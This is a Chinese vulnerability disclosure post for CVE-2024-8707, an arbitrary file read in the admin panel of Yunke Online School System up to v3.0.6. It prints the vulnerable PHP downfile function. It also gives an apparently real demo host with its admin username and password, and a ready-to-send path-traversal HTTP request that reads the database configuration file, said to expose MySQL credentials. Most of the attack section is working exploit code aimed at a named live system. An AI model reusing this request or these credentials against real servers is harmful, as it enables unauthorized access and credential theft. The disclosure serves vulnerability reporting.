
# 安全团队贡献平台

导航切换

* [首页](/)
* 所有信息
  + [所有情报](/list/all/)
  + [推荐专区](/list/recommend/)
  + [综合情报](/list/wiki/)
  + [用户提交](/list/userpost/)
  + [高校情报](/list/school/)
* [排行榜](/user/)
* [礼品中心](/gift/)
* [搜索](/search/)
* [公告](/announcements/)
* [IPwhois新功能](/ip/)
* [WooYun drops新功能](/wooyun/)
* 更多
  + [edudata平台](https://wiki.shikangsi.com/cas/jump/edudata)
  + [零组知识库-006应急响应目录](https://wiki.shikangsi.com/post/3629/)
  + [零组知识库-007内网渗透目录](https://wiki.shikangsi.com/post/3631/)
  + [零组知识库-009安全技术目录](https://wiki.shikangsi.com/post/3632/)
  + [零组知识库-010域渗透目录](https://wiki.shikangsi.com/post/3633/)
  + [零组知识库-011运维与二进制安全目录](https://wiki.shikangsi.com/post/3634/)
  + [XSS平台](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrc数据分析](http://data.shikangsi.com/)
  + [友情链接](https://wiki.shikangsi.com/links/)
  + [wiki社区](https://wiki.shikangsi.com/zone/)

[提交贡献](/add/)

[登录](/login/)

[注册](/register/)

# 【原创】（CVE-2024-8707）云课网络科技有限公司 Yunke Online School System <=v3.0.6 任意文件读取漏洞

---

分享
### 当前为私密分享，无需登录即可查看。

---

| 时间 | 作者 | 可见性 | 等级 | Rank |
| --- | --- | --- | --- | --- |
|| 2024-09-04 23:17:32 | [jackieya](/profile/948/) | 公开的 | 中危 | 3 |
| --- | --- | --- | --- | --- |

Created: 09/11/2024 06:35 PM
Changes: 09/11/2024 06:35 PM (56)
Submitter: jackieya@wiki

---

# 漏洞描述

云课网络科技有限公司开发的 Yunke Online School System 在版本 <=v3.0.6时存在后台任意文件读取漏洞。

# POC

漏洞点位于：application/admin/controller/Appadmin.php中的downfile函数中：

```
public function downfile(){
        $param=$this->request->param();
        $url=urldecode($param['url']);
        $info = get_headers($url, true);
        $size = $info['Content-Length'];
        header("Content-type:application/octet-stream");
        $origin_name = basename($url);
        header("Content-Disposition:attachment;filename = " . $origin_name);
        header("Accept-ranges:bytes");
        header("Accept-length:" . $size);
        readfile($url);
    }

```

该处的url参数可控，可以传任意敏感文件路径，从而读取敏感文件。

利用的前提是需要登录后台：https://open.yunknet.cn/admin 登录账号和密码：admin | admin123

获取登录的cookie，然后构造如下POC：

```
GET /admin/Appadmin/downfile?url=../application/database.php HTTP/1.1
Host: open.yunknet.cn
Cookie: PHPSESSID=3ssmgeq3ls22einfqmloickkbf

```

成功获取mysql的数据库的账号和密码：

![null](/media/images/2024/09/04/a3b5c4ea-12b1-458e-9911-7532cfa88b70-2n3ymytS.png)

---

审核评价： 没有任何评价...

2014-2022 © 联系邮箱：admin@sg95.cn    [鄂ICP备15020128号-4](https://beian.miit.gov.cn)

